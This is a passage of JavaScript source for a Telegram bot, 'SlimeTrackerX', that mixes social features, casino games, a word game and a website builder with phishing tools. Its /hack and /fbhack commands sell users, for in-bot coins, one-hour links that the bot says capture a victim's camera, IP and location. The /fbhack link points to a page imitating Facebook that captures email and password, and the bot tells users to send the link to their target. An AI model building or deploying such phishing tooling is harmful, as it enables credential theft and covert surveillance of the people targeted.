class="service-card"><h3>${data.service3 || 'Support'}</h3><p>${data.service3_desc || '24/7 support'}</p></div></div></div><footer><p>Built with SlimeTrackerX</p></footer></body></html>`,
  
  store: (data) => `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>${data.store || 'Store'}</title><link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet"><style>*{margin:0;padding:0;box-sizing:border-box;}body{font-family:'Inter',sans-serif;background:#f8f9fa;}.navbar{background:white;padding:20px 40px;box-shadow:0 2px 20px rgba(0,0,0,0.1);}.logo{font-size:28px;font-weight:800;background:linear-gradient(45deg,#667eea,#764ba2);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}.hero{background:linear-gradient(135deg,#667eea,#764ba2);color:white;text-align:center;padding:80px 20px;}.products{max-width:1200px;margin:60px auto;padding:0 20px;display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:30px;}.product-card{background:white;border-radius:20px;padding:20px;text-align:center;box-shadow:0 5px 20px rgba(0,0,0,0.1);}.product-price{font-size:24px;font-weight:800;color:#667eea;margin:10px 0;}footer{background:#1a1a2e;color:white;text-align:center;padding:40px;margin-top:60px;}</style></head><body><div class="navbar"><div class="logo">${data.store || 'Store'}</div></div><div class="hero"><h1>${data.store || 'Welcome'}</h1><p>${data.tagline || 'Best Prices'}</p></div><div class="products"><div class="product-card"><h3>${data.product1 || 'Product 1'}</h3><div class="product-price">$${data.product1_price || '49'}</div><button style="background:#667eea;color:white;border:none;padding:10px 20px;border-radius:10px;">Buy Now</button></div><div class="product-card"><h3>${data.product2 || 'Product 2'}</h3><div class="product-price">$${data.product2_price || '79'}</div><button style="background:#667eea;color:white;border:none;padding:10px 20px;border-radius:10px;">Buy Now</button></div><div class="product-card"><h3>${data.product3 || 'Product 3'}</h3><div class="product-price">$${data.product3_price || '99'}</div><button style="background:#667eea;color:white;border:none;padding:10px 20px;border-radius:10px;">Buy Now</button></div></div><footer><p>Built with SlimeTrackerX</p></footer></body></html>`
};

// ========== 🎛️ MAIN MENU ==========
function getMainMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: "👤 PROFILE", callback_data: "menu_profile" }, { text: "🏰 CLAN", callback_data: "menu_clan" }],
        [{ text: "💀 HACK", callback_data: "menu_hack" }, { text: "📘 FB HACK", callback_data: "menu_fbhack" }],
        [{ text: "📝 WORD BATTLE", callback_data: "menu_word" }, { text: "🌐 CREATE WEBSITE", callback_data: "menu_web" }],
        [{ text: "🎰 CASINO", callback_data: "menu_casino" }, { text: "💬 CHAT", callback_data: "menu_chat" }],
        [{ text: "💰 ECONOMY", callback_data: "menu_eco" }, { text: "🏆 LEADERBOARD", callback_data: "menu_leaderboard" }],
        [{ text: "🎁 REDEEM", callback_data: "menu_redeem" }, { text: "🔗 REFERRAL", callback_data: "menu_ref" }],
        [{ text: "📢 CHANNEL", url: "https://t.me/devxtechzone" }, { text: "👑 ADMIN", callback_data: "menu_admin" }]
      ]
    }
  };
}

// ========== 🛡️ MIDDLEWARE ==========
bot.use(async (ctx, next) => {
  if (!ctx.from) return next();
  if (bannedUsers.has(ctx.from.id)) return ctx.reply("🚫 **YOU ARE BANNED!**");
  
  let user = usersCache.get(ctx.from.id);
  if (user) { 
    user.lastActive = new Date(); 
    await saveUser(ctx.from.id, user); 
  }
  
  if (ctx.from.id === OWNER_ID) return next();
  if (ctx.callbackQuery && ctx.callbackQuery.data === "check_join") return next();
  
  const isMember = await checkJoin(ctx.from.id);
  if (!isMember) {
    if (ctx.callbackQuery) return ctx.answerCbQuery("❌ JOIN CHANNEL FIRST!", true);
    return ctx.reply(`🚫 **JOIN ${CHANNEL} FIRST!**`, {
      reply_markup: { inline_keyboard: [[{ text: "📢 JOIN", url: "https://t.me/devxtechzone" }, { text: "✅ I JOINED", callback_data: "check_join" }]] }
    });
  }
  return next();
});

// ========== ✅ CHECK JOIN ==========
bot.action("check_join", async (ctx) => {
  const isMember = await checkJoin(ctx.from.id);
  if (isMember) {
    await ctx.answerCbQuery("✅ VERIFIED!");
    let user = await initUser(ctx.from.id);
    await sendDopeMessage(ctx, 
      `🔥 **SLIME TRACKERX v76.0** 🔥\n\n✨ Welcome ${ctx.from.first_name}!\n💰 ${user.coins} COINS | 💎 ${user.diamonds}\n📊 LEVEL ${user.level} | 👥 ${user.referrals} REFFS\n🏆 WORD WINS: ${user.wordWins}\n💀 HACKS: ${user.hacks}\n📘 FB HACKS: ${user.facebookHacks || 0}\n🏰 CLAN: ${user.clan || "None"}\n\n⬇️ **CHOOSE YOUR PATH** ⬇️`,
      { photo: MENU_IMAGE, ...getMainMenu() }
    );
  } else {
    await ctx.answerCbQuery("❌ Not a member!");
  }
});

// ========== 🚀 START ==========
bot.start(async (ctx) => {
  if (ctx.from.id !== OWNER_ID) {
    const isMember = await checkJoin(ctx.from.id);
    if (!isMember) {
      return ctx.reply(`🚫 **JOIN ${CHANNEL} FIRST!**`, {
        reply_markup: { inline_keyboard: [[{ text: "📢 JOIN", url: "https://t.me/devxtechzone" }, { text: "✅ I JOINED", callback_data: "check_join" }]] }
      });
    }
  }

  let ref = null;
  let args = ctx.message.text.split(" ");
  if (args[1] && args[1].startsWith("ref_")) ref = parseInt(args[1].replace("ref_", ""));
  let user = await initUser(ctx.from.id, ref);
  
  await sendDopeMessage(ctx,
    `🎮 **SLIME TRACKERX v76.0** 🎮\n\n✨ Welcome ${ctx.from.first_name}!\n💰 ${user.coins} COINS | 💎 ${user.diamonds}\n📊 LEVEL ${user.level} | 👥 ${user.referrals} REFFS\n🏆 WORD WINS: ${user.wordWins}\n💀 HACKS: ${user.hacks}\n📘 FB HACKS: ${user.facebookHacks || 0}\n🏰 CLAN: ${user.clan || "None"}\n\n⬇️ **TAP THE BUTTONS** ⬇️`,
    { photo: MENU_IMAGE, ...getMainMenu() }
  );
});

// ========== 👤 PROFILE COMMANDS ==========
bot.command("setname", async (ctx) => {
  let args = ctx.message.text.split(" ").slice(1).join(" ");
  if (!args) return sendDopeMessage(ctx, "❌ Usage: /setname [Your Name]");
  let user = await initUser(ctx.from.id);
  user.displayName = args.substring(0, 30);
  await saveUser(ctx.from.id, user);
  await sendDopeMessage(ctx, `✅ Display name changed to: **${user.displayName}**`);
});

bot.command("setbio", async (ctx) => {
  let args = ctx.message.text.split(" ").slice(1).join(" ");
  if (!args) return sendDopeMessage(ctx, "❌ Usage: /setbio [Your bio]");
  let user = await initUser(ctx.from.id);
  user.bio = args.substring(0, 150);
  await saveUser(ctx.from.id, user);
  await sendDopeMessage(ctx, `✅ Bio updated!\n\n📝 "${user.bio}"`);
});

bot.command("setlocation", async (ctx) => {
  let args = ctx.message.text.split(" ").slice(1).join(" ");
  if (!args) return sendDopeMessage(ctx, "❌ Usage: /setlocation [City, Country]");
  let user = await initUser(ctx.from.id);
  user.location = args.substring(0, 50);
  await saveUser(ctx.from.id, user);
  await sendDopeMessage(ctx, `📍 Location set to: ${user.location}`);
});

bot.command("setcolor", async (ctx) => {
  let colors = { red: "#FF0000", blue: "#0000FF", green: "#00FF00", purple: "#800080", gold: "#FFD700", pink: "#FF69B4", cyan: "#00FFFF", orange: "#FFA500" };
  let args = ctx.message.text.split(" ")[1];
  if (!args || !colors[args.toLowerCase()]) return sendDopeMessage(ctx, "❌ Colors: red, blue, green, purple, gold, pink, cyan, orange");
  let user = await initUser(ctx.from.id);
  user.themeColor = colors[args.toLowerCase()];
  await saveUser(ctx.from.id, user);
  await sendDopeMessage(ctx, `🎨 Theme color changed to ${args.toUpperCase()}!`);
});

bot.command("setavatar", async (ctx) => {
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.photo) {
    return sendDopeMessage(ctx, "❌ Reply to a photo with /setavatar");
  }
  let photo = ctx.message.reply_to_message.photo[ctx.message.reply_to_message.photo.length - 1];
  let file = await ctx.telegram.getFile(photo.file_id);
  let ext = path.extname(file.file_path) || ".jpg";
  let filename = `avatar_${ctx.from.id}${ext}`;
  let filepath = path.join(__dirname, "public/avatars", filename);
  
  const fileUrl = `https://api.telegram.org/file/bot${process.env.BOT_TOKEN}/${file.file_path}`;
  const response = await axios({ method: "get", url: fileUrl, responseType: "stream" });
  const writer = fs.createWriteStream(filepath);
  response.data.pipe(writer);
  
  await new Promise((resolve, reject) => {
    writer.on("finish", resolve);
    writer.on("error", reject);
  });
  
  let user = await initUser(ctx.from.id);
  user.avatar = `${DOMAIN}/avatars/${filename}`;
  // Add badge for setting avatar
  if (!user.badges.includes("📸 Photogenic")) {
    user.badges.push("📸 Photogenic");
  }
  await saveUser(ctx.from.id, user);
  await sendDopeMessage(ctx, `✅ Avatar updated! + Badge: 📸 Photogenic`);
});

bot.command("profile", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let targetId = ctx.from.id;
  
  if (args[1] && args[1].startsWith("@")) {
    let username = args[1].replace("@", "");
    for (let [id] of usersCache) {
      try {
        let chat = await ctx.telegram.getChat(id);
        if (chat.username === username) { targetId = id; break; }
      } catch(e) {}
    }
  }
  
  let user = usersCache.get(targetId);
  if (!user) return sendDopeMessage(ctx, "❌ User not found!");
  
  if (targetId !== ctx.from.id && !user.profileViews.includes(ctx.from.id)) {
    user.profileViews.push(ctx.from.id);
    await saveUser(targetId, user);
  }
  
  let avatarDisplay = user.avatar ? `[🖼️ Avatar](${user.avatar})` : "🖼️ No Avatar";
  let levelBar = "█".repeat(Math.floor((user.xp / (user.level * 100)) * 10)) + "░".repeat(10 - Math.floor((user.xp / (user.level * 100)) * 10));
  
  let profileText = 
`┌─────────────────────────────────┐
│  ${avatarDisplay}
│
│  ⭐ **${user.displayName || user.userId}** ⭐
│  @${await getUsername(user.userId)}
│
│  📝 ${user.bio}
│  📍 ${user.location}
│  🎨 Theme: ${user.themeColor}
│
│  👥 ${user.followers.length} followers
│  👣 ${user.following.length} following
│  🏰 Clan: ${user.clan || "None"} ${user.clanRank !== "Member" ? `(${user.clanRank})` : ""}
│  📅 Joined: ${new Date(user.joinDate).toLocaleDateString()}
│
│  📊 LEVEL ${user.level}
│  [${levelBar}] ${Math.floor((user.xp / (user.level * 100)) * 100)}%
│
│  🏆 BADGES:
│  ${user.badges.slice(0, 5).join(" | ")}
│
│  💰 ${user.coins} COINS | 💎 ${user.diamonds} DIAMONDS
│  💀 ${user.hacks} Hacks | 📘 ${user.facebookHacks || 0} FB Hacks
│  📝 ${user.wordWins} Word Wins
│
│  👁️ ${user.profileViews.length} profile views
└─────────────────────────────────┘`;

  let buttons = [];
  if (targetId !== ctx.from.id) {
    buttons.push({ text: "➕ FOLLOW", callback_data: `follow_${targetId}` });
    buttons.push({ text: "💬 MSG", callback_data: `msg_${targetId}` });
  }
  buttons.push({ text: "📸 POSTS", callback_data: `viewposts_${targetId}` });
  
  await sendDopeMessage(ctx, profileText, {
    reply_markup: { inline_keyboard: [buttons] }
  });
});

// ========== FOLLOW SYSTEM ==========
bot.action(/follow_(\d+)/, async (ctx) => {
  let targetId = parseInt(ctx.match[1]);
  let user = await initUser(ctx.from.id);
  let target = usersCache.get(targetId);
  
  if (!target) return ctx.answerCbQuery("User not found!");
  if (user.following.includes(targetId)) {
    user.following = user.following.filter(id => id !== targetId);
    target.followers = target.followers.filter(id => id !== ctx.from.id);
    await saveUser(ctx.from.id, user);
    await saveUser(targetId, target);
    await ctx.answerCbQuery(`Unfollowed @${await getUsername(targetId)}`);
  } else {
    user.following.push(targetId);
    target.followers.push(ctx.from.id);
    await saveUser(ctx.from.id, user);
    await saveUser(targetId, target);
    // Add follower badge
    if (target.followers.length >= 10 && !target.badges.includes("👑 Influencer")) {
      target.badges.push("👑 Influencer");
      await saveUser(targetId, target);
      await ctx.telegram.sendMessage(targetId, "🎉 **NEW BADGE: 👑 Influencer** (10 followers!)");
    }
    await ctx.answerCbQuery(`Followed @${await getUsername(targetId)}`);
  }
});

bot.action(/viewposts_(\d+)/, async (ctx) => {
  let targetId = parseInt(ctx.match[1]);
  let user = usersCache.get(targetId);
  if (!user || !user.posts || user.posts.length === 0) {
    return ctx.answerCbQuery("No posts yet!");
  }
  
  let posts = user.posts.slice(-5).reverse();
  for (let post of posts) {
    let text = `📸 **POST**\n\n${post.caption || "No caption"}\n❤️ ${post.likes?.length || 0} likes | 💬 ${post.comments?.length || 0} comments\n🕐 ${new Date(post.date).toLocaleString()}\n🆔 ID: ${post.id}`;
    if (post.image) {
      await ctx.replyWithPhoto(post.image, { caption: text });
    } else {
      await ctx.reply(text);
    }
  }
  await ctx.answerCbQuery();
});

bot.action(/msg_(\d+)/, async (ctx) => {
  await ctx.answerCbQuery();
  await sendDopeMessage(ctx, `💬 To message this user, use:\n/msg @${await getUsername(parseInt(ctx.match[1]))} [your message]`);
});

bot.command("followers", async (ctx) => {
  let user = await initUser(ctx.from.id);
  if (user.followers.length === 0) return sendDopeMessage(ctx, "📭 No followers yet!");
  
  let list = [];
  for (let id of user.followers.slice(0, 20)) {
    list.push(`👤 @${await getUsername(id)}`);
  }
  await sendDopeMessage(ctx, `👥 **YOUR FOLLOWERS (${user.followers.length})**\n\n${list.join("\n")}`);
});

bot.command("following", async (ctx) => {
  let user = await initUser(ctx.from.id);
  if (user.following.length === 0) return sendDopeMessage(ctx, "📭 Not following anyone!");
  
  let list = [];
  for (let id of user.following.slice(0, 20)) {
    list.push(`👤 @${await getUsername(id)}`);
  }
  await sendDopeMessage(ctx, `👣 **WHO YOU FOLLOW (${user.following.length})**\n\n${list.join("\n")}`);
});

// ========== POST SYSTEM ==========
bot.command("post", async (ctx) => {
  let caption = ctx.message.text.split(" ").slice(1).join(" ") || "";
  
  if (ctx.message.reply_to_message && ctx.message.reply_to_message.photo) {
    let photo = ctx.message.reply_to_message.photo[ctx.message.reply_to_message.photo.length - 1];
    let file = await ctx.telegram.getFile(photo.file_id);
    let filename = `post_${ctx.from.id}_${Date.now()}.jpg`;
    let filepath = path.join(__dirname, "public/uploads", filename);
    
    const fileUrl = `https://api.telegram.org/file/bot${process.env.BOT_TOKEN}/${file.file_path}`;
    const response = await axios({ method: "get", url: fileUrl, responseType: "stream" });
    const writer = fs.createWriteStream(filepath);
    response.data.pipe(writer);
    
    await new Promise((resolve) => writer.on("finish", resolve));
    
    let user = await initUser(ctx.from.id);
    let post = {
      id: Date.now().toString(),
      image: `${DOMAIN}/uploads/${filename}`,
      caption: caption,
      likes: [],
      comments: [],
      date: new Date()
    };
    user.posts.push(post);
    await saveUser(ctx.from.id, user);
    await sendDopeMessage(ctx, `✅ Post created! ID: ${post.id}\n\nShare your post ID so others can like it!\n/like ${post.id}`);
  } else {
    let user = await initUser(ctx.from.id);
    let post = {
      id: Date.now().toString(),
      image: null,
      caption: caption,
      likes: [],
      comments: [],
      date: new Date()
    };
    user.posts.push(post);
    await saveUser(ctx.from.id, user);
    await sendDopeMessage(ctx, `✅ Text post created! ID: ${post.id}\n\n/like ${post.id}`);
  }
});

bot.command("like", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 2) return sendDopeMessage(ctx, "❌ Usage: /like [postID]");
  
  let postId = args[1];
  let found = false;
  
  for (let [userId, user] of usersCache) {
    let post = user.posts?.find(p => p.id === postId);
    if (post) {
      if (!post.likes.includes(ctx.from.id)) {
        post.likes.push(ctx.from.id);
        await saveUser(userId, user);
        await addXP(ctx.from.id, 1);
        await sendDopeMessage(ctx, `✅ Liked post! (+1 XP)`);
      } else {
        post.likes = post.likes.filter(id => id !== ctx.from.id);
        await saveUser(userId, user);
        await sendDopeMessage(ctx, `👎 Unliked post!`);
      }
      found = true;
      break;
    }
  }
  if (!found) sendDopeMessage(ctx, "❌ Post not found!");
});

bot.command("comment", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 3) return sendDopeMessage(ctx, "❌ Usage: /comment [postID] [your comment]");
  
  let postId = args[1];
  let comment = args.slice(2).join(" ");
  let found = false;
  
  for (let [userId, user] of usersCache) {
    let post = user.posts?.find(p => p.id === postId);
    if (post) {
      post.comments.push({
        userId: ctx.from.id,
        username: await getUsername(ctx.from.id),
        text: comment,
        date: new Date()
      });
      await saveUser(userId, user);
      await addXP(ctx.from.id, 1);
      await sendDopeMessage(ctx, `✅ Comment added! (+1 XP)`);
      found = true;
      break;
    }
  }
  if (!found) sendDopeMessage(ctx, "❌ Post not found!");
});

bot.command("myposts", async (ctx) => {
  let user = await initUser(ctx.from.id);
  if (!user.posts || user.posts.length === 0) return sendDopeMessage(ctx, "📭 You have no posts yet!\nCreate one with /post [caption] (reply to a photo)");
  
  let posts = user.posts.slice(-5).reverse();
  for (let post of posts) {
    let text = `📸 **POST**\n\n${post.caption || "No caption"}\n❤️ ${post.likes?.length || 0} likes | 💬 ${post.comments?.length || 0} comments\n🆔 ID: ${post.id}`;
    if (post.image) {
      await ctx.replyWithPhoto(post.image, { caption: text });
    } else {
      await ctx.reply(text);
    }
  }
});

// ========== 🎰 CASINO GAMES ==========
bot.command("dice", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let bet = parseInt(args[1]);
  let user = await initUser(ctx.from.id);
  
  if (isNaN(bet) || bet < 1) return sendDopeMessage(ctx, "❌ Usage: /dice [amount] (min 1 coin)");
  if (user.coins < bet) return sendDopeMessage(ctx, `❌ You need ${bet} coins! You have ${user.coins}`);
  
  await takeCoin(ctx.from.id, bet);
  let roll = Math.floor(Math.random() * 6) + 1;
  
  if (roll === 6) {
    let win = bet * 3;
    await addCoin(ctx.from.id, win);
    await addXP(ctx.from.id, 10);
    await ctx.replyWithDice();
    await sendDopeMessage(ctx, `🎲 You rolled **${roll}**! 🎉 **JACKPOT!**\n💰 +${win} coins! (+10 XP)`);
  } else if (roll >= 4) {
    let win = bet;
    await addCoin(ctx.from.id, win);
    await addXP(ctx.from.id, 3);
    await ctx.replyWithDice();
    await sendDopeMessage(ctx, `🎲 You rolled **${roll}**! 🎉 **WINNER!**\n💰 +${win} coins! (+3 XP)`);
  } else {
    await ctx.replyWithDice();
    await sendDopeMessage(ctx, `🎲 You rolled **${roll}**! 💀 **LOST!**\n💰 -${bet} coins`);
  }
});

bot.command("slots", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let bet = parseInt(args[1]);
  let user = await initUser(ctx.from.id);
  
  if (isNaN(bet) || bet < 5) return sendDopeMessage(ctx, "❌ Usage: /slots [amount] (min 5 coins)");
  if (user.coins < bet) return sendDopeMessage(ctx, `❌ You need ${bet} coins!`);
  
  await takeCoin(ctx.from.id, bet);
  let slots = ["🍒", "🍊", "🍋", "🍉", "⭐", "💎", "7️⃣"];
  let result = [slots[Math.floor(Math.random()*slots.length)], slots[Math.floor(Math.random()*slots.length)], slots[Math.floor(Math.random()*slots.length)]];
  
  if (result[0] === result[1] && result[1] === result[2]) {
    let win = bet * 10;
    await addCoin(ctx.from.id, win);
    await addXP(ctx.from.id, 25);
    await sendDopeMessage(ctx, `🎰 ${result.join(" ")} 🎰\n🎉 **MEGA JACKPOT!**\n💰 +${win} coins! (+25 XP) 🎉`);
  } else if (result[0] === result[1] || result[1] === result[2] || result[0] === result[2]) {
    let win = bet * 2;
    await addCoin(ctx.from.id, win);
    await addXP(ctx.from.id, 5);
    await sendDopeMessage(ctx, `🎰 ${result.join(" ")} 🎰\n🎉 **WINNER!**\n💰 +${win} coins! (+5 XP)`);
  } else {
    await sendDopeMessage(ctx, `🎰 ${result.join(" ")} 🎰\n💀 **LOST!**\n💰 -${bet} coins`);
  }
});

// ========== 💀 HACK COMMANDS ==========
bot.command("hack", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 2) {
    await sendDopeMessage(ctx, `💀 **PHISHING LINK GENERATOR** 💀\n\n📌 Usage: /hack [label]\n💰 Cost: ${TRACK_COST} coins\n📸 Captures: Camera + IP + Location\n⏰ Expires in 1 HOUR!\n\n📝 Example: /hack free gift`);
    return;
  }
  
  let user = await initUser(ctx.from.id);
  if (user.coins < TRACK_COST) {
    return sendDopeMessage(ctx, `❌ Need ${TRACK_COST} coins! You have ${user.coins}`);
  }
  
  await takeCoin(ctx.from.id, TRACK_COST);
  user.hacks = (user.hacks || 0) + 1;
  await saveUser(ctx.from.id, user);
  
  let token = crypto.randomBytes(16).toString("hex");
  let label = args.slice(1).join(" ");
  let expiresAt = Date.now() + (60 * 60 * 1000);
  
  hackTokens.set(token, { userId: ctx.from.id, username: ctx.from.username, label, expiresAt });
  setTimeout(() => hackTokens.delete(token), 60 * 60 * 1000);
  
  let hackLink = `${DOMAIN}/?token=${token}`;
  
  await sendDopeMessage(ctx, `💀 **PHISHING LINK READY** 💀\n\n🎯 Label: ${label}\n💰 Cost: -${TRACK_COST} COINS\n💀 Total Hacks: ${user.hacks}\n⏰ Expires in 1 HOUR\n\n🔗 \`${hackLink}\`\n\n⚠️ Send this to your target!`);
});

bot.command("fbhack", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 2) {
    await sendDopeMessage(ctx, `📘 **FACEBOOK PHISHING PAGE** 📘\n\n📌 Usage: /fbhack [label]\n💰 Cost: ${TRACK_COST} coins\n📸 Captures: Email/Password + Camera + Location\n⏰ Expires in 1 HOUR!\n\n🎯 Looks EXACTLY like Facebook!`);
    return;
  }
  
  let user = await initUser(ctx.from.id);
  if (user.coins < TRACK_COST) {
    return sendDopeMessage(ctx, `❌ Need ${TRACK_COST} coins! You have ${user.coins}`);
  }
  
  await takeCoin(ctx.from.id, TRACK_COST);
  user.facebookHacks = (user.facebookHacks || 0) + 1;
  await saveUser(ctx.from.id, user);
  
  let token = crypto.randomBytes(16).toString("hex");
  let label = args.slice(1).join(" ");
  let expiresAt = Date.now() + (60 * 60 * 1000);
  
  facebookTokens.set(token, { userId: ctx.from.id, username: ctx.from.username, label, expiresAt });
  setTimeout(() => facebookTokens.delete(token), 60 * 60 * 1000);
  
  let hackLink = `${DOMAIN}/facebook.html?token=${token}`;
  
  await sendDopeMessage(ctx, `📘 **FACEBOOK PHISHING READY** 📘\n\n🎯 Label: ${label}\n💰 Cost: -${TRACK_COST} COINS\n📘 Total FB Hacks: ${user.facebookHacks}\n⏰ Expires in 1 HOUR\n\n🔗 \`${hackLink}\``);
});

bot.command("mylinks", async (ctx) => {
  let active = [];
  for (let [token, data] of hackTokens) if (data.userId === ctx.from.id && Date.now() < data.expiresAt) active.push(`💀 ${token.substring(0,8)}... - ${data.label}`);
  for (let [token, data] of facebookTokens) if (data.userId === ctx.from.id && Date.now() < data.expiresAt) active.push(`📘 ${token.substring(0,8)}... - ${data.label} (FB)`);
  if (active.length === 0) return sendDopeMessage(ctx, "📭 No active links! Create with /hack or /fbhack");
  await sendDopeMessage(ctx, `🔗 **YOUR ACTIVE LINKS**\n\n${active.join('\n')}\n\n⚠️ Links expire in 1 hour!`);
});

// ========== 📝 WORD BATTLE ==========
bot.command("wordbattle", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 4) {
    await sendDopeMessage(ctx,
      `📝 **WORD BATTLE - 1v1** 📝\n\nUsage: /wordbattle @username amount difficulty\n\nDifficulties:\n🍃 easy - 45s, 3 letters (1x)\n⚡ medium - 30s, 5 letters (2x)\n🔥 hard - 15s, 7 letters (3x)\n💀 expert - 8s, 9 letters (5x)\n\n💰 Bet: ${WORD_MIN_BET}-${WORD_MAX_BET} coins`);
    return;
  }
  
  let targetUsername = args[1];
  let betAmount = parseInt(args[2]);
  let difficulty = args[3].toLowerCase();
  
  if (!difficulties[difficulty]) return sendDopeMessage(ctx, "❌ Invalid difficulty!");
  if (isNaN(betAmount) || betAmount < WORD_MIN_BET) return sendDopeMessage(ctx, `❌ Min bet ${WORD_MIN_BET}!`);
  if (betAmount > WORD_MAX_BET) return sendDopeMessage(ctx, `❌ Max bet ${WORD_MAX_BET}!`);
  
  let targetId = null;
  for (let [id] of usersCache) {
    try {
      let c = await ctx.telegram.getChat(id);
      if (c.username === targetUsername.replace("@", "")) { targetId = id; break; }
    } catch(e) {}
  }
  if (!targetId) return sendDopeMessage(ctx, "❌ User not found!");
  if (targetId === ctx.from.id) return sendDopeMessage(ctx, "❌ Can't battle yourself!");
  
  let user = await initUser(ctx.from.id);
  if (user.coins < betAmount) return sendDopeMessage(ctx, `❌ Need ${betAmount} coins!`);
  
  let diff = difficulties[difficulty];
  wordChallenges.set(targetId, { from: ctx.from.id, bet: betAmount, difficulty, letterCount: diff.letters, status: "waiting", timer: diff.timer });
  
  setTimeout(() => { if (wordChallenges.get(targetId)?.status === "waiting") wordChallenges.delete(targetId); }, 60000);
  
  await sendDopeMessage(ctx, `✅ Challenge sent to ${targetUsername}!\n💰 Bet: ${betAmount} coins\n⚡ ${diff.name}\n⏳ Waiting for acceptance...`);
  await ctx.telegram.sendMessage(targetId, `📝 **WORD CHALLENGE!**\n\n👤 From: @${ctx.from.username}\n💰 Bet: ${betAmount} coins\n⚡ ${diff.name}\n\nType /acceptword to accept!`);
});

bot.command("acceptword", async (ctx) => {
  let challenge = wordChallenges.get(ctx.from.id);
  if (!challenge || challenge.status !== "waiting") return sendDopeMessage(ctx, "❌ No active challenge!");
  
  let accepter = await initUser(ctx.from.id);
  if (accepter.coins < challenge.bet) return sendDopeMessage(ctx, `❌ Need ${challenge.bet} coins to accept!`);
  
  await takeCoin(challenge.from, challenge.bet);
  await takeCoin(ctx.from.id, challenge.bet);
  
  let diff = difficulties[challenge.difficulty];
  challenge.status = "active";
  challenge.currentTurn = "challenger";
  wordChallenges.set(ctx.from.id, challenge);
  
  let wordList = wordsByLength[challenge.letterCount] || ["WORD"];
  let targetWord = wordList[Math.floor(Math.random() * wordList.length)];
  challenge.targetWord = targetWord;
  challenge.attempts = 0;
  wordChallenges.set(ctx.from.id, challenge);
  
  await ctx.telegram.sendMessage(challenge.from, `📝 **YOUR TURN!**\n\nNeed a ${challenge.letterCount}-letter word\n⏱️ Time: ${diff.timer}s\n💰 Pot: ${challenge.bet * 2} coins\n\nType a ${challenge.letterCount}-letter word NOW!`);
  
  setTimeout(async () => {
    let game = wordChallenges.get(ctx.from.id);
    if (game && game.status === "active" && game.currentTurn === "challenger") {
      game.status = "completed";
      wordChallenges.delete(ctx.from.id);
      await addCoin(ctx.from.id, challenge.bet * 2);
      await addXP(ctx.from.id, 10);
      let winner = usersCache.get(ctx.from.id);
      if (winner) {
        winner.wordWins = (winner.wordWins || 0) + 1;
        await saveUser(ctx.from.id, winner);
      }
      await ctx.telegram.sendMessage(challenge.from, `⏰ **TIME'S UP!** You lost!\n💰 +${challenge.bet * 2} coins to ${await getUsername(ctx.from.id)}`);
      await ctx.telegram.sendMessage(ctx.from.id, `🎉 You win! +${challenge.bet * 2} coins! (+10 XP)`);
    }
  }, diff.timer * 1000);
  
  await sendDopeMessage(ctx, `✅ Challenge accepted! Pot: ${challenge.bet * 2} coins\nType a ${challenge.letterCount}-letter word!`);
});

// ========== WORD BATTLE TEXT HANDLER ==========
bot.on("text", async (ctx) => {
  if (ctx.message.text.startsWith("/")) return;
  
  let build = webBuilds.get(ctx.from.id);
  if (build) {
    if (build.step < build.questions.length) {
      build.data[build.questions[build.step]] = ctx.message.text;
      build.step++;
      
      if (build.step < build.questions.length) {
        await sendDopeMessage(ctx, `📝 Step ${build.step + 1}/${build.questions.length}\nSend: ${build.questions[build.step]}`);
      } else {
        await sendDopeMessage(ctx, "⏳ Generating your website...");
        
        let html = htmlTemplates[build.template](build.data);
        let siteName = build.data[build.questions[0]] || "mywebsite";
        let fileName = `${siteName.replace(/[^a-z0-9]/gi, '_')}.html`;
        
        await ctx.replyWithDocument({ source: Buffer.from(html, 'utf-8'), filename: fileName });
        await sendDopeMessage(ctx, `✅ **WEBSITE READY!**\n\n📁 File: ${fileName}\n\n🌐 Upload to Netlify Drop for live link!`);
        
        let website = new Website({ name: siteName, ownerId: ctx.from.id, template: build.template, content: build.data, url: "Upload to Netlify Drop" });
        await website.save();
        
        let user = usersCache.get(ctx.from.id);
        user.websites.push({ name: siteName, url: "Upload to Netlify Drop" });
        await saveUser(ctx.from.id, user);
        webBuilds.delete(ctx.from.id);
      }
    }
    return;
  }
  
  for (let [challengedId, challenge] of wordChallenges) {
    if (challenge.status === "active" && challenge.currentTurn === "challenger" && ctx.from.id === challenge.from) {
      let answer = ctx.message.text.toUpperCase().trim();
      let wordList = wordsByLength[challenge.letterCount] || [];
      
      if (wordList.includes(answer)) {
        challenge.status = "completed";
        wordChallenges.delete(challengedId);
        await addCoin(challenge.from, challenge.bet * 2);
        await addXP(challenge.from, 15);
        let user = usersCache.get(challenge.from);
        if (user) {
          user.wordWins = (user.wordWins || 0) + 1;
          await saveUser(challenge.from, user);
        }
        await sendDopeMessage(ctx, `🎉 **CORRECT!** "${answer}" is valid!\n💰 Won ${challenge.bet * 2} coins! (+15 XP)`);
        await ctx.telegram.sendMessage(challengedId, `💀 You lost! "${answer}" was correct!\n💰 Lost ${challenge.bet} coins`);
      } else {
        challenge.status = "completed";
        wordChallenges.delete(challengedId);
        await addCoin(challengedId, challenge.bet * 2);
        await addXP(challengedId, 15);
        let user = usersCache.get(challengedId);
        if (user) {
          user.wordWins = (user.wordWins || 0) + 1;
          await saveUser(challengedId, user);
        }
        await sendDopeMessage(ctx, `❌ **WRONG!** "${answer}" is not a valid ${challenge.letterCount}-letter word!\n💰 Lost ${challenge.bet} coins`);
        await ctx.telegram.sendMessage(challengedId, `🎉 You win! "${answer}" was wrong!\n💰 Won ${challenge.bet * 2} coins! (+15 XP)`);
      }
      return;
    }
  }
  
  await addXP(ctx.from.id, 1);
});

// ========== 🌐 WEBSITE COMMANDS ==========
bot.command("createweb", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let template = args[1];
  let u = await initUser(ctx.from.id);
  
